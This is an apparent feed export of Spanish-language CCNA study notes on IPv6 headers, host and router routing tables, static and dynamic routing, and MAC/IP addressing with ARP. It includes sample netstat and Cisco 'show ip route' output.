 <br><br>IPv4 todavía está en uso hoy en día. Este artículloo trata sobre IPv6, qu eventualmente reemplazará a IPv4. Para comprender mejor por qué necesitamos conocer este protocolo tenemos que entender las limitaciones de IPv4 y las ventajas de IPv6 ante este.<br>A lo largo de los años, se han elaborado protocolos y procesos adicionales para hacer frente a los neuvos desafíos. Sin embargo, incluso con estso cambios, IPv4 aún tien tres grandes problemas:<br>
<br>
Agotamiento de la dirección IPv4: IPv4 tiene un número limitado de direcciones públicas únicas disponibles. Si bien hay aproximadamente 4000 millones de direcciones IPv4, el incremento en la cantidad de dispositivos nuevos con IP habilitado, las conexiones constantes y el crecimiento de regios menos desarrolladas aumenta la necesidad de direcciones.

<br>
Falta de conectividad de extremo a extremo: La traducción de direcciones de red (NAT) es una tecnología comúnmente implementada dentro de las redes IPv4. NAT proporciona una manera para que varios dispositivos compartan una única dirección IPv4 pública. Sin embargo, dado que la dirección IPv4 pública se comparte, se oculta la dirección IPv4 de un host de la red interna. Esto puede ser un problema para las tecnologías que necesitan conectividad completa.

<br>
Mayor complejidad de la red: Mientras que NAT ha ampliado la vida útil de IPv4, solo se trataba  de un mecanismo de transición a IPv6. NAT en sus diversas implementaciones crea una complejidad adicional a la red, creando latencia y ahciendo más difícil la solución de problemas.

<br><br><br>Ahora... un renglon de historia de parte de su querido servidor Dobliuw... a principios de la década de 1990, los problemas con IPv4 preocuparon al Grupo de trabajo de ingeniería de Internet (IETF) que, en consecuencia, comenzaron a buscar un remplazo. Esto tuvo como resultado el desarrollo de IP versión 6 (IPv6). Este supera las slimitaciones de IPv4 y representa una mejora importante con características que se adptan mejor a las demandas de red actuales y previsibles.<br>Estas mejoras incluyen:<br>
<br>Manejo de paquetes mejorado: Las direcciones IPv6 se basan en el direccionamiento jerárquico de 128 bits en lugar de IPv4 con 32 bits.
<br>Mejor manejo de paquetes: El encabezado IPv6 se ha simplificado con menos campos.
<br>Elimina la necesidad de NAT: Con una cantidad tan grande de direcciones IPv6 públicas, no se necesita NAT entre una dirección IPv4 privada y una IPv4 pública. Esto evita algunos de los porblemas incluidos por NAT que experimentan las aplicaciones que requieren conectividad de extremo a extremo.
<br>El espacio de las direcciones IPv4 de 32 bits ofrece aproximadamente 4.294.967.296 direcciones únicas. Por otro lado, las direcciones públicas ofrecias por IPv6 son de 340,282,366,920,938,463,463,374,607,431,768,211,456, o 340 undecillones de direcciones.<br><img alt="Pasted image 20241017163331.png" src="https://dobliuw.com/lib/media/pasted-image-20241017163331.png"><br>La línea roja representa las 4000 millones de direcciones IPv4 vs la línea amarilla que representa las 340 sextillones de direcciones IPv6.<br><br><br>Una de las mejoras de diseño más importantes de IPv6 con respecto a IPv4 es el encabezado simplificado que esté tiene.<br>Por ejemplo, el encabezado IPv4 consiste en un header de longitud variable de 20 octetos (Hasta 60 bytes si se usa el campo Opciones) y 12 campos de encabezado básicos, sin inlcuir el campo Opciones y el campo Relleno.<br>Para IPv6, algunos campos se han mantenido igual, algunos campos han cambiado de nombre y posición, y algunos campos de IPv4 ya no son necesarios, como de destaca en la siguiente imagén:<br>
<br>IPv4 Packet Headers:<br>
<img alt="Pasted image 20241021153232.png" src="https://dobliuw.com/lib/media/pasted-image-20241021153232.png">
<br>Esta imagen muestra los campos de encabezado de paquetes IPv4 que se mantuvieron, movieron, cambiaron, así como aquellos que no se mantuvieron en el header IPv6.<br>De igual manera, en contraste, el encabezado IPv6 simplificado que se muestra en la siguiente imagen consiste en un encabezado de longitud fija de 40 octetos (En gran parte debido a la longitud de las direcciones IPv6 de origen y destino).<br>El encabezado simplificado IPv6 permite un procesamiento más eficiente de encabezados IPv6.<br>
<br>IPv6 Packet Headers:<br>
<img alt="Pasted image 20241021153528.png" src="https://dobliuw.com/lib/media/pasted-image-20241021153528.png">
<br>Esta imagen muestra los campos de encabezado de paquetes IPv5 que se mantuvieron o movieron junto con los nuevos campos de encabezado de paquetes IPv6.<br><br><br>El diagrama de encabezado del protocolo IP en la ilustración identifica los campos de un paquete IPv6: <br><img alt="Pasted image 20241021153528.png" src="https://dobliuw.com/lib/media/pasted-image-20241021153528.png"><br>Los campos en este encabezado incluyen lo siguiente:<br>
<br>Version / Versión: Este campo contiene un valor binario de 4 bits establecido en 0110 que identifica esto como un paquete IP versión 6.
<br>Traffic Class / Clase de tráfico: Este campo de 8 bits es equivalente al campo de Servicios diferenciados (DS) IPv4.
<br>Flow Label / Etiqueta de flujo: Este campo de 20 bits sugiere que todos los pqeutes con la misma etiqueta de flujo reciben el mismo tipo de manejo por routers.
<br>Payload Length / Longitud de carga útil: Este campo de 16 bits indica la longitud de la porción de datos o carga útil del paquete IPv6. Esto no incluye la longitud del encabezado IPv6, que posee un tamaño fijo de 40 bytes.
<br>Next Header / Encabezado siguiente: Este campo de 8 bits es equivalente al campo de Protocolo IPv4. Es un calor que indica el tipo de contenido de datos que lleva el paquete, lo que permite que la capa de red transmita la información al protocolo de capa superior apropiado.
<br>Hop Limit / Límite de salto: Este campo de 8 bits reemplaza al campo TTL de IPv4. Cada router que reenvía el paquete reduce este valor en 1. Cuando el contado llega a 0, el paquete se descarga y se reenvía un mensajae ICMPv6 Tiempo excedido al host emisor. Esto ídnica que el paquete no llegó a su destino porque se edxcedió el límite de saltos.  A diferencia de IPv4, IPv6 no incluye un hash de comprobación de encabezado IPv6, ya que esta función se realiza tanto en las capas inferior como superior. Esto significa que la suma de comporbación no necesita ser recalculada por cad arouter cuando disminuye el campo límite de salgos, lo que también mejora el rendimiento de la red.
<br>Source / Dirección IPv6 de origen: Este campo de 128 bits identifica la dirección IPv6 del host emisor.
<br>Destination / Dirección IPv6 de destino: Este campo de 128 bits identifica la dirección IPv6 del host receptor.
<br>Un paquete IPv6 también puede contener encabezados de extensión (EH), que proveen información optativa de la capa de red. Los headers de extensión son opcionales y están ubicados entre el header de IPv6 y el contenido. Los EH se usan para fragmentar, dar seguridad, admitir la movilidad y otras acciones.<br>A diferencia de IPv4, los routers no fragmentan los paquetes IPv6 enrutados.]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/1.-layer-3-to-7/3.-network/2.-ipv6-packet.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/1. Layer 3 to 7/3. Network/2. IPv6 Packet.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 21 Oct 2024 18:46:54 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20241017163331.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20241017163331.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Host Forwarding Decision]]></title><description><![CDATA[ 
 <br><br>Con IPv4 e IPv6, los paquetes siempre se crean en el host de origen. El host de origen debe poder dirigir el paquete al host de destino. Para ello, los dispositivos finales de host crean su propia tabla de enrutamiento. En este documento su fiel servidor Dobliuw explicará cómo los dispositivos finales utilizan las tablas de enrutamiento basandose en los contenidos impartidos en el CCNA 1.<br>Otra función de la capa de red es dirigir los paquetes entre hosts. Un host puede enviar un paquete a lo siguiente: <br>
<br>Itself: Un host puede hacer ping a sí mismo enviando un paquete a una dirección IPv4 especial (127.0.0.1) o una dirección IPv6 (::1), que se conoce como la interfaz loop back. El hacer ping a la interfaz lo (Loop Back), pone a prueba la pila del protocolo TCP/IP en el host.
<br>Local Host Este es un host de destino que se encuentra en la misma red local que el host emisor. Los hosts de origen y destino comparten la misma dirección de red. 
<br>Remote Host: Este es un host de destino en una red remota. Los hosts de origen y destino no comparten la misma dirección de red.
<br>La siguiente imagen ilustra la conexión de PC1 a un host local en la misma red y a un host remoto ubicado en otra red: <br><img alt="Pasted image 20241021155703.png" src="https://dobliuw.com/lib/media/pasted-image-20241021155703.png"><br>El dispositivo final de origen determina si un paquete está destinado a un host local o a un host remoto. El dispositivo final de origen determina si la dirección IP  de destino está en la misma red en la que está el propio dispositivo de origen. EL método de determinación varía según la versión IP:<br>
<br>With IPv4: El dispositivo de origen utiliz asu propia máscara de subred junto con su propia dirección IPv4 y la dirección IPv4 de destino para realizar esta determinación.
<br>With IPv6: El router local anuncia la dirección de red local (Prefijo) a todos los dispositivos de la red.
<br>En una red doméstica o comercial, podemos encontrarnos con varios dispositivos cableados e inalámbricos interconectados mediante un dispositivo intermediario, como un switch LAN o un punto de acceso inalámbrico (WAP). Este dispositivo intermediario proporciona interconexiones entre hosts locales en una red local. Los hosts locales pueden conectarse y compartir información sin la necesidad de dispositivos adicionales. Si un host está enviando un paquete a un dispositivo que está configurado con la misma red IP que el dispositivo host, el paquete simplemente se reenvía desde la interfaz del host, a través del dispositivo intermediario, y directamente al dispositivo de destino (Como se explica en la sección de <a data-href="3. Switches and MAC Address Table" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/3.-switches-and-mac-address-table.html" class="internal-link" target="_self" rel="noopener nofollow">3. Switches and MAC Address Table</a>).<br>Por supuesto, en la mayoría de las situaciones queremos que nuestros dispositivos puedan conectarse más allá del segmento de red local, como a otros hogares, negocios e Internet. Los dispositivos que no están en el segmento de red local se denominan "módulo remoto de E/S". Cuando un dispositivo de origen envía un paquete a un dispositivo de destino remoto, se necesita la ayuda de los routers y del enrutamiento. El enrutamiento es el proceso de indentificación de la mejor ruta para llegar a un destino. El router conectado al segmento de red local se denomina default gateway.<br><br><br>La "puerta de enlace predeterminada" (Default Gateway) es el dispositivo de red (Es decir el router o switch de Capa 3) que puede enrutar el tráfico a otras redes. Si se piensa en una red como si fueran habitaciones, el default gateway es la puerta. Sí se desea acceder a otra red, se necesitará localizar su correspondiente default gateway.<br>En una red, una puerta de enlace predeterminada suele ser un router con las siguientes caracteríscticas:<br>
<br>Tiene una dirección IP local en el mismo rango de direcciones que otros hosts en la redl local.
<br>Puede aceptar datos en la red local y reenviar datos fuera de la red local.
<br>Enruta el tráfico a otras redes.
<br>Se requiere una puerta de enlace predeterminada para enviar tráfico fuera de la red local. El tráfico no se puede reenviar fuera de la red local si no hay un default gateway, la dirección de esta no está configurada o está desactivada.<br><br><br>Una tabla de enrutamiento de host generalmente incluirá un default gateway. En IPv4, el host recibe la dirección IPv4 del default gateway, ya sea dinámicamente desde el Dynamic Host Configuration Protocol (DHCP) o configurado manualmente. En IPv6, el router anuncia la dirección del default gateway o el host se puede configurar manualmente.<br>En esta imagen, tanto la PC1 y la PC2 están configuradas con la dirección IPv4 de 192.168.10.1 como Default Gateway: <br><img alt="Pasted image 20241021161512.png" src="https://dobliuw.com/lib/media/pasted-image-20241021161512.png"><br>La configuración de un gateway predeterminado genera una ruta predeterminada en la tabla de enrutamiento de la PC. Una ruta predeterminada es la ruta o camino que la PC utiliza cuando intenta conectarse a la red remota.<br>Tanto la PC1 como la PC2 tendrán una ruta predeterminada para enviar todo el tráfico destinado a las redes remotas al R1.<br><br><br>En un host de Windows, el comando route print o netstat -r, nos servirá para mostrar la tabla de enrutamiento del host. Ambos comandos generarán el mismo resultado. Al principio, estos resultados podrían no terminar de entenderse, pero son bastante fáciles al final.<br>La siguiente imagén muestra una topología de ejemplo y la salida generada por netstat -r: <br><img alt="Pasted image 20241021161837.png" src="https://dobliuw.com/lib/media/pasted-image-20241021161837.png"><br>
<br>netstat -r output:
<br>C:\Users\PC1&gt; netstat -r

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination   Netmask          Gateway         Interface    Metric
          0.0.0.0     0.0.0.0          192.168.10.1    192.168.10.10    25
        127.0.0.0     255.0.0.0        On-link         127.0.0.1       306
        127.0.0.1     255.255.255.255  On-link         127.0.0.1       306
  127.255.255.255     255.255.255.255  On-link         127.0.0.1       306
     192.168.10.0     255.255.255.0    On-link         192.168.10.10   281
    192.168.10.10     255.255.255.255  On-link         192.168.10.10   281
   192.168.10.255     255.255.255.255  On-link         192.168.10.10   281
        224.0.0.0     240.0.0.0        On-link         127.0.0.1       306
        224.0.0.0     240.0.0.0        On-link         192.168.10.10   281
  255.255.255.255     255.255.255.255  On-link         127.0.0.1       306
  255.255.255.255     255.255.255.255  On-link         192.168.10.10   281
===========================================================================
Copy<br>Esta salida sólo refleja la tabla de rutas IPv4.<br>Al ingresar este comando, se muestran tres secciones relacionadas con las conexiones TCP/IP actuales:<br>
<br>Interfaces List: Enumera la dirección de control de acceso a medios (MAC) y el número de interfaz asignado de cada interfaz con la capacidad de red en el host, incluidos los adaptadores Ethernet, Wi-Fi y Bluetooth.
<br>IPv4 Routes Table: Enumera todas las rutas IPv4 conocidas, incluidas las conexiones directas, la red local y las rutas locales predeterminadas.
<br>IPv6 Routes Table: Enumera todas las rutas IPv6 conocidas, incluidas las conexiones directas, la red local y las rutas locales predeterminadas.
]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/1.-layer-3-to-7/3.-network/3.-how-routing-works.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/1. Layer 3 to 7/3. Network/3. How routing works.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 21 Oct 2024 19:24:12 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20241021155703.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20241021155703.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Router Packet Forwarding Decision]]></title><description><![CDATA[ 
 <br><br>En el documento anterior (<a data-href="3. How routing works" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/1.-layer-3-to-7/3.-network/3.-how-routing-works.html" class="internal-link" target="_self" rel="noopener nofollow">3. How routing works</a>) se discutieron las tablas de enrutamiento de host. La mayoría de las redes también contienen routers, que son dispositivos intermediarios. Los routers también contienen tablas de enrutamiento. En este docuemnto se tratarán las operaciones del router en la Capa de red (O Capa 3). Cuando un host envía un paquete a otro host, consulta su tabla de enrutamiento para determinar dónde enviar el paquete. Si el host de destino está en una red remota, el paquete se reenvía a la puerta de enlace predeterminada, que generalmente es el router de la red local.<br>En las redes domésticas, lo que conocemos como "Modem" si lo analizamos en profundidad no es más que un dispositivo de Capa 3 el cual consta de un Switch LAN, un Wireless Access Point y un Router. Este dispositivo nos permite conectarnos de manera inalámbrica, por cable (<a data-href="0. Copper Wiring" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/wiring/copper/0.-copper-wiring.html" class="internal-link" target="_self" rel="noopener nofollow">0. Copper Wiring</a> o <a data-href="0. Fiber Optic Wiring" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/1.-physical/wiring/fiber-optic/0.-fiber-optic-wiring.html" class="internal-link" target="_self" rel="noopener nofollow">0. Fiber Optic Wiring</a>) a la par que conectarnos con redes externas.<br>¿ Qué sucede cuando llega un paquete a la interfaz de un router ?<br>El router examina la dirección IP de destino del paquete y busca en su tabal de enrutamiento para determina dónde reenviar la pqeute. La tabla de enrutamiento contiene una lista de todas las direcciones de red conocidas (Prefijos) y dónode reenviar el paquete. Estas entradas se conocen como entradas de ruta o rutas. El router reenviará el paquete utilizando la mejor entrada de ruta que coincida (Más larga).<br><img alt="Pasted image 20241021163618.png" src="https://dobliuw.com/lib/media/pasted-image-20241021163618.png"><br>
<br>El paquete llega a la interfaz Gigabit Ethernet 0/0/0 del router R1. Este desencapsula el encabezado Ethernet de Capa 2 y el trailer.
<br>El router R1 examina la dirección IPv4 de destino del paquete y busca la mejor coincidencia en su tabla de enrutamiento IPv4. La entrada de ruta indica que este paquete se reenviará al router R2.
<br>El router R1 encapsula el paquete en una nueva trama Ethernet y reenvía el paquete al siguiente router de salto R2.
<br>La siguiente tabla muestra la información poseeida por la tabla de ruteo del Router R1:<br><br><br><br>La tabla de enrutamiento IP del router contiene entradas de ruta de red que enumeran todos los posibles destinos de red conocidos.<br>La tabla de enrutamiento almacena tres tipos de entrada de ruta:<br>
<br>Redes conectadas directamente: Estas entradas de ruta de red son interfaces de router activas. Los routers agrega una ruta conectada directamente cuando la interfaz se configura con una dirección IP y se activa. Cada interfaz de router está conectada a un segmento de red diferente. En la imagen, las redes conectadas directamenta en la tabla de enrutamiento IPv4 R1 serían 192.168.10.0/24 y 209.165.200.224/30.
<br>Redes remotas: Estas entradas de ruta de red están conectadas a otros routers. Los routers aprenden acerca de las redes remotas ya sea mediante la configuarción explícita de una administrador o mediante el intercambio de información de ruta mediante un protocolo de enrutamiento dinámico. En la imagen, la red remota en la tabla de enrutamiento IPv4 R1 sería 10.1.1.0/24.
<br>Ruta predeterminada: Al igual que un host, la mayoría de los routers también incluyen una entrada de ruta predeterminada, un default gateway de útimo recurso. La r uta predeterminada se utiliza cuando no hay una mejor coincidencia (Más larga) en la tabla de enrutamiento IP. En la imagen, la tabla de enrutamiento IPv4 RQ probablemente incluirá una ruta predeterminada para reenviar todos los paquetes al router R2.
<br>La imagen identifica las redes directamente conectadas y remotas del router R1 antes mencionadas: <br><img alt="Pasted image 20241021164442.png" src="https://dobliuw.com/lib/media/pasted-image-20241021164442.png"><br>Un router puede descubrir redes remotas de dos maneras:<br>
<br>Manualmente: Las redes remotas se ingresan manualmente en la tabla de rutas emdiantes rutas estáticas.
<br>Dinámicamente: Las rutas remotas se aprenden automáticamente mediante un protocolo de enrutamiento dinámico.
<br><br><br>Las rutas estáticas son entradas de ruta que se configuran manualmente. La imagen a continuación muestra un ejemplo de una ruta estática que se configuró manualmente en el router R1. La ruta estática inlcuye la dirección de red remota y la dirección IP del router de salto siguiente.<br><img alt="Pasted image 20241021164802.png" src="https://dobliuw.com/lib/media/pasted-image-20241021164802.png"><br>Si hay un cambio en la topología de la red, la red estática no se actualiza automáticamente y debe reconfigurarse manualmente. Por ejemplo, en la imagen R1 tiene una ruta estática para llegar a la red 10.1.1.0/24 a través de R2. Si esa ruta ya no está disponible, R1 tendría que reconfigurarse con una nueva ruta estática a la red 10.1.1.0/24 a través de R3. Por lo tanto, el router R3 necesitaría tener una entrada de ruta en su tabal de enrutamiento para enviar paquetes destinados a 10.1.1.0/24.<br><img alt="Pasted image 20241021165237.png" src="https://dobliuw.com/lib/media/pasted-image-20241021165237.png"><br>El enrutamiento estático tiene las sigueintes acracterísticas: <br>
<br>Una ruta estática debe configuarse manualmente.
<br>El administrador necesita vover a configurar una ruta estática si hay un cambio en la topología y la ruta estática ya no es variable.
<br>Una ruta estática es apropiada para una red pequeña y cuando hay pocos o ninguno de los enlaces redundantes. 
<br>Una ruta estática se usa comúnmente con un protocolo de enrutamiento dinámico para configurar una ruta predeterminada.
<br><br><br>Un protocolo de enrutamiento dinámico permite a los routers aprender automáticamente sobre redes remotas, incluida una ruta predeterminada, de otros routers. Los routers que usan protocolos de enrutamiento dinámico comparten automáticamente la información de enrutamiento con otros routes y compensan cualquier cambio de topología sin que sea necesaria la participación del administrador de la red. Si se produce un cambio en la topología de red, los routers comparten esta información mediante el protocolo de enrutamineto dinámico y se acutalizan automáticamente sus tablas de enrutamiento.<br>Los protocolos de enrutamiento dinámico incluyen OSPF (Open Shortest Path First) y EIGRP (Enhanced Interior Gateway Routing Protocol). La imagen a continuación muestra un ejemplo de routers (R1 y R2) que comparten automáticamente información de red mediante el protocolo de enrutamiento OSPF<br><img alt="Pasted image 20241021170140.png" src="https://dobliuw.com/lib/media/pasted-image-20241021170140.png"><br>La configuración básica sólo requiere que el administrador de red habilita las redes conectadas directamente dentro del protocolo de enrutamiento dinámico. El protocolo de enrutamiento dinámico hará automáticamente lo siguiente: <br>
<br>Detectar redes remotas.
<br>Mantener información de enrutamiento actualizada. 
<br>Elijir el mejor camino hacia las redes de destino.
<br>Intentar encontrar una nueva mejor ruta si la ruta actual ya no está disponible.
<br><img alt="Pasted image 20241021170155.png" src="https://dobliuw.com/lib/media/pasted-image-20241021170155.png"><br><br><br>A continuación, observaremos en la imagen que R2 está conectado a INternet. Por lo tanto, el administrador configuró R1 con una ruta estática predeterminada que envía paquetes a R2 cuando no hay ningun entrada específica en la tabla de enrutamiento que coincida con la dirección IP de destino. R1 y R2 también están utilizando el enrutamiento OSPF para anunciar redes conectadas directamente.<br><img alt="Pasted image 20241021222146.png" src="https://dobliuw.com/lib/media/pasted-image-20241021222146.png"><br>R1&gt; enable
R1# show ip route
Codes: L - local, C - connected, S - static, R - RIP, M - mobile, B - BGP
       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
       E1 - OSPF external type 1, E2 - OSPF external type 2
       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2
       ia - IS-IS inter area, * - candidate default, U - per-user static route
       o - ODR, P - periodic downloaded static route, H - NHRP, l - LISP
       a - application route
       + - replicated route, % - next hop override, p - overrides from PfR
Gateway of last resort is 209.165.200.226 to network 0.0.0.0
S*    0.0.0.0/0 [1/0] via 209.165.200.226, GigabitEthernet0/0/1
      10.0.0.0/24 is subnetted, 1 subnets
O        10.1.1.0 [110/2] via 209.165.200.226, 00:02:45, GigabitEthernet0/0/1
      192.168.10.0/24 is variably subnetted, 2 subnets, 2 masks
C        192.168.10.0/24 is directly connected, GigabitEthernet0/0/0
L        192.168.10.1/32 is directly connected, GigabitEthernet0/0/0
      209.165.200.0/24 is variably subnetted, 2 subnets, 2 masks
C        209.165.200.224/30 is directly connected, GigabitEthernet0/0/1
L        209.165.200.225/32 is directly connected, GigabitEthernet0/0/1
R1#
Copy<br>El comando show ip route de EXEC mode privilegiado se utiliza para ver la tabla de enrutamiento IPv4 en un router Cisco IOS: El ejemplo muestra la tabla de enrutamiento IPv4 del router R1. Al principio de cada entrada de tabla de enrutamiento hay un código que se utiliza para identificar el tipo de ruta o cómo se aprendió la misma. Entre las fuentes de ruta comunes (Códigos) se incluyen las siguientes:<br>
<br>L: Dirección IP de interfaz local conectada directamente.
<br>C: Red conectada directamente.
<br>S: La ruta estática fue configurada manualmente por un administrador.
<br>O: OSPF 
<br>D: EIGRP
<br>La tabla de enrutamiento muestra todas las rutas de destino IPv4 conocidas para R1.<br>Una ruta conectada directamente se crea automáticamente cuando se configura una interfaz de router con información de dirección IP y se activa. El router añade dos entradas de ruta con los códigos C (Es decir, la red conectada) y L (Es decir, la dirección IP de la interfaz local de la red conectada). Las entradas de ruta también identifian la interfaz de salida que se utilizará para llegar a la red. Las dos redes conectadas directamente en este ejmplo son 192.168.10.0/24 y 209.165.200.224/30.<br>Los r outers R1 y R2 también están utilizando el protocolo de enrutamiento dinámico OSPF para intercambiar información de router. En la tabla de enrutamiento de ejmplo, R1 tiene una entrada de reuta para la red 10.1.1.0/24 que aprendió dinámicamente del router R2 a trvés del protocolo de enrutamiento OSPF.<br>Una ruta predeterminada tiene una dirección de red de todos los ceros. POr ejemplo, la dirección de red IPv4 es 0.0.0.0. Una entrada de ruta estática en la tabla de enrutamiento comienza con un código de S*, como se resalta en el ejemplo. ]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/1.-layer-3-to-7/3.-network/4.-routing.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/1. Layer 3 to 7/3. Network/4. Routing.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 22 Oct 2024 01:28:04 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20241021163618.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20241021163618.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Destination in the same Network]]></title><description><![CDATA[ 
 <br><br>A veces, un host debe enviar un mensaje, pero solo conoce la dirección IP del dispositivo de destino. el host necesita saber la dirección MAC deese dispositivo, pero ¿Cómo se puede descubrir? Ahí es donde la resolución de direcciones se vuelve crítica.<br>Hay dos direcciones primarias asignadas a un dispositivo en una LAN Ethernet:<br>
<br>MAC Address (Dirección Física): Se utiliza para comunicaciones NIC a NIC en la misma red Ethernet.
<br>IP Address (Dirección Logica): Se utiliza para enviar el paquete desde el dispositivo de origen al dispostivio de destino. La dirección IP de destino puede estar en la misma red ip que la de origen o en una red remota. 
<br>Las direcciones físicas de Capa 2 (Es decir, las direcciones MAC de Ethernet <a data-href="0. Data Link Layer" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/0.-layer-1-and-2/2.-data-link/0.-data-link-layer.html" class="internal-link" target="_self" rel="noopener nofollow">0. Data Link Layer</a>) se utilizan para entregar la trama de enlace de datos con el paquete IP encapsulado de una NIC (Network Interface Card) a otra NIC que está en la misma red. Si la dirección IP de destino está en la misma red, la dirección MAC de destino es la del dispostivo de destino.<br>Consideremos el sigueinte ejemplo utilizando representaciones de direcciones MAC simplificadas: <br><img alt="Pasted image 20241023122700.png" src="https://dobliuw.com/lib/media/pasted-image-20241023122700.png"><br>En este ejemplo, PC1 desea enviar un paquete a PC2. La imagen muestra las direcciones MAC de origen y destino de Capa 2 y el direccionamiento IPv4 de Capa 3 que se incluirían en el paquete enviado desde PC1.<br>La trama Ethernet de Capa 2 contiene los siguiente:<br>
<br>Destination MAC Address: Esta es la dirección MAC simplificada de PC2, 55-55-55.
<br>Origin MAC Address: Esta es la dirección MAC simplifícada de la NIC Ethernet de PC1, AA-AA-AA.
<br>El Paquete IP de Capa 3 contiene lo siguiente:<br>
<br>Origin IPv4 Address: Esta es la dirección IPv4 de PC1, 192.168.10.10.
<br>Destination IPv4 Address: Esta es la dirección IPv4 de PC2, 192.168.10.11. 
<br><br><br>Ahora bien, cuando la dirección IP de destino (IPv4 o IPv6) está en una red remota, la dirección MAC de destino será la dirección de gateway predeterminada del host (Es decir, la interfaz del router).<br>Consideremos el siguiente ejmplo utilizando una representación de dirección MAC simplifícada: <br><img alt="Pasted image 20241023123339.png" src="https://dobliuw.com/lib/media/pasted-image-20241023123339.png"><br>En este ejmplo, PC1 desea enviar un paquete a PC2. PC2 se encuentra en una red remota. Dado que la dirección IPv4 de destino no está en la misma red local que PC1, la dirección MAC de destino es la del default gateway local en el router.<br>Como sabemos en este punto, los switches de Capa 3 (Routers) examinan la dirección IPv4 de destino para determinar la mejor ruta para reenviar el paquete IPv4. Cuando el router recibe una trama de Ethernet, desencapsula la información de Capa 2. Por medio de la dirección IP de destino, determina el dispositivo del sigueinte salto y desencapsula el paquete IP en una nueva tram de enlace de datos para la interfaz de salida.<br>En nuestro ejemplo, R1 ahora encapsularía el paquete con la nueva informacuión de dirección de Capa 2 como se muestra en la siguiente imagen:<br><img alt="Pasted image 20241023123346.png" src="https://dobliuw.com/lib/media/pasted-image-20241023123346.png"><br>La nueva dirección MAC de destino sería la de la interfaz R2 G0/0/1 y la nueva dirección MAC de origen sería la de la interfaz R1 G0/0/1.<br>A lo largo de cada enlace de una ruta, un paquete IP se encapsula en una trama. La trama es específica de la tecnología de enlace de datos asociada a ese vínculo, como Ethernet. Si el dispostiivo del sigueinte salto es el destino final, la dirección MAC de destino será la de la NIC de Ethernet del dispositivo, como se muestra en la siguiente imagen:<br><img alt="Pasted image 20241023123354.png" src="https://dobliuw.com/lib/media/pasted-image-20241023123354.png"><br>¿Cómo se asocian las direcciones IP de los paquetes IP en un flujo de datos con las direcciones MAC en cada enlace a lo largo de la ruta hacia el destino? Para los paquetes IPv4, esto se realiza a través de un proceso llamado Address Resolution Protocol (ARP). Para los paquetes IPv6, el proceso es ICMPv6 Neighbor Discovery (ND). ]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/1.-layer-3-to-7/arp/0.-mac-and-ip.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/1. Layer 3 to 7/ARP/0. MAC and IP.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Wed, 23 Oct 2024 15:42:55 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20241023122700.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20241023122700.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[General Description about ARP]]></title><description><![CDATA[ 
 <br><br>Si nuestra red utiliza el protocolo de comunicaciones IPv4, el Protocolo de Resolución de Direcciones o ARP es lo que se necesita para asignar direcciones IPv4 a direcciones MAC. En este documento se explicará cómo funciona ARP.<br>Cada dispositivo IP de una red Ethernet tiene una dirección MAC Ethernet única. Cuando un dispositivo envía una trama de Capa 2 de Ethernet, contiene como sabemos las siguientes dos direcciones:<br>
<br>Destination MAC Address.
<br>Origin MAC Address.
<br>La imagen a continuación ilustrará el problema al enviar una trama a otro host en el mismo segmento en una red IPv4: <br><img alt="Pasted image 20241023124613.png" src="https://dobliuw.com/lib/media/pasted-image-20241023124613.png"><br>Para enviar un paquete a otro host en la misma red IPv4 local, un host debe conocer la dirección IPv4 y la dirección MAC del dispositivo de destino. Las direcciones IPv4 de destino del dispositivo se conoce o se resuelven por el nombre del dispositivo. Sin embargo, las direcciones MAC deben ser descubiertas.<br>Un dispositivo utiliza el Address Resolution Protocol (ARP) para determinar la dirección MAC de destino de un dispositivo local cuando conoce su dirección IPv4.<br>ARP proporciona dos funciones básicas:<br>
<br>Resolución de direcciones IPv4 a direcciones MAC.
<br>Mantener una tabla de asignaciones de direcciones IPv4 a MAC.
